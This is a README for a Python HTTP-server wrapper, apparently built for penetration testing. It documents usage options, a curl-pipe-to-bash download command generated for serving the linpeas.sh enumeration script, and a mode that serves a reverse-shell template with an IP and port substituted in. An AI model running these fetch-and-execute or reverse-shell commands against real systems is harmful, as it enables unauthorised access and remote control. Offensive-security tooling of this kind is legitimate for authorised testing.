# http-server

> Extension for python's http server. It eases serving content, supports SSL too.

## Usage

```
usage: server.py [-h] [--bind addr] [--verbose] [--ssl] [--kv K1=V1:K2=V2] [index] [port]

positional arguments:
  index                 Specify content to serve, defaults to current directory
  port                  Specify alternate port, default: 9000

optional arguments:
  -h, --help            show this help message and exit
  --bind addr, -b addr  Specify alternate bind address, default: 0.0.0.0
  --verbose, -v         Increase verbosity, print request
  --ssl, -ssl           Use SSL
  --kv K1=V1:K2=V2      Specify match-and-replace rules
```

### 1. Serve static content

> If no arguments are specified, it serves files from the current directory under the port and interface specified in [config.json](config.json).

```bash
$ alias serve="../path-to/httpserver/server.py"
$ serve /example/directory
```

- If a file is specified as first argument, the option for copying the download command is provided based on the file
  extension:

```bash
$ serve /path/to/linpeas.sh 
Serving /path/to/linpeas.sh at http://0.0.0.0:9000
Copy 'curl -k -s http://0.0.0.0:9000 | bash' to clipboard? [Enter] 
Copied ✔️
```

- The above command can be shortened as:

```bash
$ serve lp
```

given the following entry in [config.json](config.json):

```json
{
  "alias": {
    "lp": "/path/to/linpeas.sh"
  }
}
```

### 2. Serve dynamic content

> Reverse shell, template: [shell.sh](res/shell.sh)

```bash
$ serve rev --kv REPLACE_IP=$ip:REPLACE_PORT=9000
```
